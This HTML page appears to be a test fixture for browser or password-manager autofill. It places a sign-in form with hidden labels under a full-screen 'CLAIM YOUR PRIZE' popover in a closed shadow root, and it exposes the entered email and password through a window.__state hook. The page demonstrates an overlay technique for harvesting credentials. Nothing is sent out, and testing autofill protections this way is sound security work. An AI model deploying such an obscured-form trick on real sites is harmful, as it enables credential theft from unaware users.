<!doctype html><title>Claim</title><style>body{margin:0}label{font-size:0}#user{position:fixed;left:100px;top:100px}#pass{position:fixed;left:100px;top:130px}#go{position:fixed;left:400px;top:100px}</style><form id="f" action="#" onsubmit="event.preventDefault()"><label>Email <input id="user" name="email" autocomplete="username"></label><label>Password <input id="pass" name="password" type="password" autocomplete="current-password"></label><button id="go" type="submit">Sign in</button></form><div id="sh"></div>
<script>window.__log=[];window.__state=()=>({user:document.getElementById('user')?.value,pass:document.getElementById('pass')?.value,log:window.__log,origin:self.origin});const q=new URLSearchParams(location.search);const opener=(id)=>{const el=document.getElementById(id);if(q.get('how')==='focus')el.focus();else el.dispatchEvent(new FocusEvent('focusin',{bubbles:true,composed:true}));};
const root=document.getElementById('sh').attachShadow({mode:'closed'});
const cover=document.createElement('div');cover.setAttribute('popover','manual');cover.style.cssText='position:fixed;inset:0;width:100vw;height:100vh;max-width:none;max-height:none;margin:0;border:0;padding:0;background:#fff;pointer-events:none;font:30px sans-serif';cover.textContent='CLAIM YOUR PRIZE';root.appendChild(cover);
addEventListener('load',()=>setTimeout(()=>{ opener('user'); setTimeout(()=>cover.showPopover(),150); },600));</script>
